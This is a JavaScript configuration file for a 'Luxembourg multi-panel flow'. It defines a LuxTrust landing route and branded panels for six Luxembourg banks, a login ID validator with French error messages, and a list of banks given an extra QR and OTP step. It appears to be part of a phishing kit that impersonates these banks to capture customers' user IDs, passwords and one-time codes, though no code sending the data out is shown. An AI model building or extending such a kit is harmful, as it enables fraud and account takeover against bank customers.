// Central config for Luxembourg multi-panel flow.
// Routes: / (LuxTrust landing), /bgl, /ing, /eboo, /rnet
// Step 1 for every bank is always: User ID (4 digits + 4 letters) + Password.

export const USER_ID_REGEX = /^[A-Za-z]{4}\d{4}$/;
export const USER_ID_EXAMPLE = "ABCD1234";

export function validateUserId(v) {
  const clean = (v || "").replace(/[\s-]/g, "");
  if (!clean) return "L'identifiant est requis.";
  if (!USER_ID_REGEX.test(clean))
    return `L'identifiant doit comporter 4 lettres + 4 chiffres (ex. ${USER_ID_EXAMPLE}).`;
  return "";
}

export const BANKS = [
  {
    slug: "bgl",
    short: "BGL",
    name: "BGL BNP Paribas",
    sub: "Web Banking",
    urlLabel: "/bgl",
    color: "#00915a",
    dark: "#007a4b",
    soft: "#e6f4ed",
    initial: "B",
  },
  {
    slug: "ing",
    short: "ING",
    name: "ING Luxembourg",
    sub: "My ING",
    urlLabel: "/ing",
    color: "#ff6200",
    dark: "#e55700",
    soft: "#fff1e6",
    initial: "I",
  },
  {
    slug: "eboo",
    short: "EBOO",
    name: "POST Luxembourg",
    sub: "eboo eBanking",
    urlLabel: "/eboo",
    color: "#1b4fa0",
    dark: "#143c7a",
    soft: "#e8eefb",
    initial: "P",
  },
  {
    slug: "rnet",
    short: "R-NET",
    name: "Banque Raiffeisen",
    sub: "Banque en ligne R-Net",
    urlLabel: "/rnet",
    color: "#003da5",
    dark: "#002f7d",
    soft: "#e8eefb",
    initial: "R",
  },
  {
    slug: "bil",
    short: "BIL",
    name: "BIL",
    sub: "BILnet",
    urlLabel: "/bil",
    color: "#002d5c",
    dark: "#001f40",
    soft: "#e8edf3",
    initial: "B",
  },
  {
    slug: "spuerkeess",
    short: "SPUERKEESS",
    name: "Spuerkeess",
    sub: "S-Net",
    urlLabel: "/spuerkeess",
    color: "#d8232a",
    dark: "#a8151c",
    soft: "#fdeaea",
    initial: "S",
  },
];

export function getBank(slug) {
  return BANKS.find((b) => b.slug === (slug || "").toLowerCase());
}

// Banks with the extra QR + OTP step (same process as BIL).
export const QR_BANKS = ["bil", "spuerkeess"];
